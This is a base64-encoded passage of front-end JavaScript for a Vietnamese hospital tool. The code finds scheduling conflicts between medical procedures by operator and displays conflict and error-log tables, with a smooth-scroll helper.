jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykudmFsdWU7DQoNCiBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QudG9nZ2xlKCdzaG93LWRvY3RvcicsIHNob3dEb2N0b3IpOw0KICAgIC8vID09PT09IDEuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEvhur5UIFFV4bqiIEtJ4buCTSBUUkEgWFVORyDEkOG7mFQgPT09PT0NCiAgICBjb25zdCBmaWx0ZXJlZFByb2NlZHVyZXMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLmNvbmZsaWN0KSANCiAgICAgICAgOiBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpICYmIHAuY29uZmxpY3QpOw0KDQogICAgY29uc3QgcmVzdWx0Qm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRCb2R5Jyk7DQogICAgcmVzdWx0Qm9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIC8vIE5ow7NtIGPDoWMgdGjhu6cgdGh14bqtdCB4dW5nIMSR4buZdCB24bubaSBuaGF1DQogICAgY29uc3QgY29uZmxpY3RHcm91cHMgPSBbXTsNCiAgICBjb25zdCBwcm9jZXNzZWRSb3dzID0gbmV3IFNldCgpOw0KDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvY2Vzc2VkUm93cy5oYXMocHJvYy5yb3dJbmRleCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwID0gW3Byb2NdOw0KICAgICAgICAgICAgcHJvY2Vzc2VkUm93cy5hZGQocHJvYy5yb3dJbmRleCk7DQoNCiAgICAgICAgICAgIC8vIFTDrG0gdGjhu6cgdGh14bqtdCBsacOqbiBxdWFuIHRyb25nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICBpZiAocHJvYy5jb25mbGljdFJlYXNvbikgew0KICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0TWF0Y2hlcyA9IHByb2MuY29uZmxpY3RSZWFzb24ubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+4oCiIE5nw6B5OiAoLio/KTxicj7igKIgVGjhu51pIGdpYW46ICguKj8pLS9nKTsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RNYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0TWF0Y2hlcy5mb3JFYWNoKG1hdGNoID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnROYW1lID0gbWF0Y2gubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+LylbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlID0gbWF0Y2gubWF0Y2goL05nw6B5OiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWUgPSBtYXRjaC5tYXRjaCgvVGjhu51pIGdpYW46ICguKj8pLS8pWzFdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2MgPSBmaWx0ZXJlZFByb2NlZHVyZXMuZmluZChwID0+IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAucGF0aWVudE5hbWUgPT09IHBhdGllbnROYW1lICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLmRpc3BsYXlTdGFydCA9PT0gdGltZSAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICFwcm9jZXNzZWRSb3dzLmhhcyhwLnJvd0luZGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmZsaWN0UHJvYykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VwLnB1c2goY29uZmxpY3RQcm9jKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChjb25mbGljdFByb2Mucm93SW5kZXgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjb25mbGljdEdyb3Vwcy5wdXNoKGdyb3VwKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAvLyBIaeG7g24gdGjhu4sga+G6v3QgcXXhuqMNCiAgICBjb25mbGljdEdyb3Vwcy5mb3JFYWNoKGdyb3VwID0+IHsNCiAgICAgICAgZ3JvdXAuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCdjb25mbGljdC1yb3cnKTsNCiAgICAgICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cHJvYy5wYXRpZW50QWdlfTwvZm9udD5dIDxici8+ICR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7cHJvYy5kYXRlfTxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0gLSAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtwcm9jLmRvY3Rvcn08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiI+JHtwcm9jLnN1Z2dlc3Rpb24gfHwgJ0tow7RuZyBjw7MgeHVuZyDEkeG7mXQnfTwvdGQ+DQogICAgICAgICAgICBgOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICB9KTsNCg0KICAgICAgICAvLyBUaMOqbSBkw7JuZyBwaMOibiBjw6FjaA0KICAgICAgICBpZiAoZ3JvdXAubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgY29uc3Qgc2VwYXJhdG9yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHNlcGFyYXRvci5pbm5lckhUTUwgPSAnPHRkIGNvbHNwYW49IjgiIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+JzsNCiAgICAgICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQoc2VwYXJhdG9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAgLy8gTuG6v3Uga2jDtG5nIGPDsyBuaMOzbSBuw6BvIHRow6wgdGjDqm0gZMOybmcgYsOhbyAiS2jDtG5nIGPDsyBs4buXaSINCiAgICBpZiAoY29uZmxpY3RHcm91cHMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSJjbGFzcz0iaGVyYi1yb3cgY29uZmxpY3Qtcm93Ij5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9DQoNCiAgICAvLyA9PT09PSAyLiBM4buMQyBWw4AgSEnhu4JOIFRI4buKIELhuqJORyBM4buWSSA9PT09PQ0KY29uc3Qgb3BlcmF0b3JFcnJvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdEVycm9yJykudmFsdWU7DQogY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvckVycm9yID09PSAnYWxsJyANCiAgID8gZXJyb3JMb2cgDQogICA6IGVycm9yTG9nLmZpbHRlcihlcnJvciA9Pg0KICAgICAgIGVycm9yLmRldGFpbHMgJiYNCiAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IgJiYNCiAgICAgICBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvckVycm9yLnJlcGxhY2UoLywvZywgJycpDQogICAgKTsNCg0KICAgIC8vIEhp4buDbiB0aOG7iyBs4buXaSDEkcOjIGzhu41jDQogICAgY29uc3QgZXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT4gPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvdGQ+PC90cj48L3Rib2R5PjwvdGFibGU+YDsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KLy8vLy8vLy9C4bqjbmcgbOG7jWMvLy8vLy8vLy8vLw0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMucGF0aWVudEFnZSB8fCAnMDAnfTwvZm9udD5dPGJyLz4gJHtlcnJvci5kZXRhaWxzLnBhdGllbnRJZCB8fCAnMDAwMDAwJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KCQkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtlcnJvci5kZXRhaWxzLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLm9wZXJhdG9yID8gZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGV0YWlscy5uZ2F5VGh1Y0hpZW4gfHwgKGVycm9yLmRldGFpbHMuZGF0ZSB8fCAnS2jDtG5nIGPDsycpfSA8YnIvPiR7DQogICAgICAgICAgICAgICAgICAgIGVycm9yLmRldGFpbHMuc3RhcnRUaW1lID8gYCR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWV9IC0gJHtlcnJvci5kZXRhaWxzLmVuZFRpbWV9YCA6ICdLaMO0bmcgY8OzJw0KICAgICAgICAgICAgICAgIH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgICAgICAgIDxiPjxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dDwvZm9udD48L2I+IChU4buRaSB0aGnhu4N1OiAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWR9IHBow7p0KWAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9ICR7ZXJyb3Iucm93ID8gJyhEw7JuZyAnICsgZXJyb3Iucm93ICsgJyknIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nRXJyb3IobWVzc2FnZSwgcm93ID0gbnVsbCwgZGV0YWlscyA9IG51bGwpIHsNCiAgICAgICAgICAgIGVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgIG1lc3NhZ2UsDQogICAgICAgICAgICAgICAgcm93LA0KICAgICAgICAgICAgICAgIGRldGFpbHMsDQogICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvTG9jYWxlVGltZVN0cmluZygpLA0KICAgICAgICAgICAgICAgIHVzZXI6IGN1cnJlbnRVc2VyDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQpmdW5jdGlvbiBkaXNwbGF5RXJyb3JzKCkgew0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgDQogICAgaWYgKGVycm9yTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIA0KICAgICAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24gS+G6v3QgUXXhuqMgS2nhu4NtIFRyYQ0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJlc3VsdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpOw0KICAgICAgICAgICAgaWYgKHJlc3VsdFNlY3Rpb24gJiYgcmVzdWx0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZScpIHsNCiAgICAgICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhyZXN1bHRTZWN0aW9uLCAtNDApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9LCAzMDApOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIHThu6tuZyBs4buXaQ0KICAgIGVycm9yTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMucGF0aWVudEFnZSB8fCAnMDAnfTwvZm9udD5dPGJyLz4gJHtlcnJvci5kZXRhaWxzLnBhdGllbnRJZCB8fCAnMDAwMDAwJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtlcnJvci5kZXRhaWxzLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLm9wZXJhdG9yID8gZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGV0YWlscy5uZ2F5VGh1Y0hpZW4gfHwgKGVycm9yLmRldGFpbHMuZGF0ZSB8fCAnS2jDtG5nIGPDsycpfSA8YnIvPiR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgIDxiPjxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dDwvZm9udD48L2I+ICAgKFThu5FpIHRoaeG7g3U6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNiIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBDdeG7mW4geHXhu5FuZyBwaOG6p24gbOG7l2kgbuG6v3UgY8OzDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGNvbnN0IGVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKTsNCiAgICAgICAgaWYgKGVycm9yU2VjdGlvbikgew0KICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8oZXJyb3JTZWN0aW9uLCAtMTMwKTsNCiAgICAgICAgfQ0KICAgIH0sIDMwMCk7DQp9DQoNCi8vIEjDoG0gY3Xhu5luIG3GsOG7o3QgdOG7lW5nIHF1w6F0DQpmdW5jdGlvbiBzbW9vdGhTY3JvbGxUbyhlbGVtZW50LCBvZmZzZXQgPSAwKSB7DQogICAgZWxlbWVudC5jbGFzc0xpc3QuYWRkKCdoaWdobGlnaHQtZXJyb3Itc2VjdGlvbicpOw0KICAgIA0KICAgIGNvbnN0IGVsZW1lbnRQb3NpdGlvbiA9IGVsZW1lbnQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCkudG9wOw0KICAgIGNvbnN0IG9mZnNldFBvc2l0aW9uID0gZWxlbWVudFBvc2l0aW9uICsgd2luZG93LnBhZ2VZT2Zmc2V0IC0gb2Zmc2V0Ow0KICAgIA0KICAgIGNvbnN0IGR1cmF0aW9uID0gMTUwMDsNCiAgICBjb25zdCBzdGFydCA9IHdpbmRvdy5wYWdlWU9mZnNldDsNCiAgICBjb25zdCBzdGFydFRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICANCiAgICBmdW5jdGlvbiBzY3JvbGxTdGVwKHRpbWVzdGFtcCkgew0KICAgICAgICBjb25zdCBlbGFwc2VkID0gdGltZXN0YW1wIC0gc3RhcnRUaW1lOw0KICAgICAgICBjb25zdCBwcm9ncmVzcyA9IE1hdGgubWluKGVsYXBzZWQgLyBkdXJhdGlvbiwgMSk7DQogICAgICAgIGNvbnN0IGVhc2luZyA9IGVhc2VJbk91dEN1YmljKHByb2dyZXNzKTsNCiAgICAgICAgd2luZG93LnNjcm9sbFRvKDAsIHN0YXJ0ICsgKG9mZnNldFBvc2l0aW9uIC0gc3RhcnQpICogZWFzaW5nKTsNCiAgICAgICAgDQogICAgICAgIGlmIChwcm9ncmVzcyA8IDEpIHsNCiAgICAgICAgICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gZWFzZUluT3V0Q3ViaWModCkgew0KICAgICAgICByZXR1cm4gdCA8IDAuNSA/IDQgKiB0ICogdCAqIHQgOiAxIC0gTWF0aC5wb3coLTIgKiB0ICsgMiwgMykgLyAyOw0KICAgIH0NCiAgICANCiAgICB3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHNjcm9sbFN0ZXApOw0KICAgIA0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBlbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgfSwgMjAwMCk7DQp9DQoNCg0KIC8vID09PT09PSBC4bquVCBT4buwIEtJ4buGTiBDSEVDS0JPWCAiQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kiID09PT09PQ0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dIZXJiRXJyb3JEYXlzQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3Qgc2hvd09ubHlFcnJvckRheXMgPSB0aGlzLmNoZWNrZWQ7DQoNCiAgICAvLyAxLiBM4bqleSB0b8OgbiBi4buZIG5nw6B5IHThu6sgYWxsUHJvY2VkdXJlcw0KICAgIGNvbnN0IGFsbERhdGVzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV07DQoNCiAgICAvLyAyLiBO4bq/dSBi4bqtdCBjaGVja2JveCAtPiBjaOG7iSBnaeG7ryBuZ8OgeSBjw7Mgc+G6r2MgdGh14buRYyBs4buXaQ0KICAgIGxldCBkYXRlc1RvU2hvdyA9IGFsbERhdGVzOw0KICAgIGlmIChzaG93T25seUVycm9yRGF5cykgew0KICAgICAgICBjb25zdCBoZXJiRGF0ZXMgPSBuZXcgU2V0KCh3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW10pLm1hcChoID0+IGguZGF0ZSkpOw0KICAgICAgICBkYXR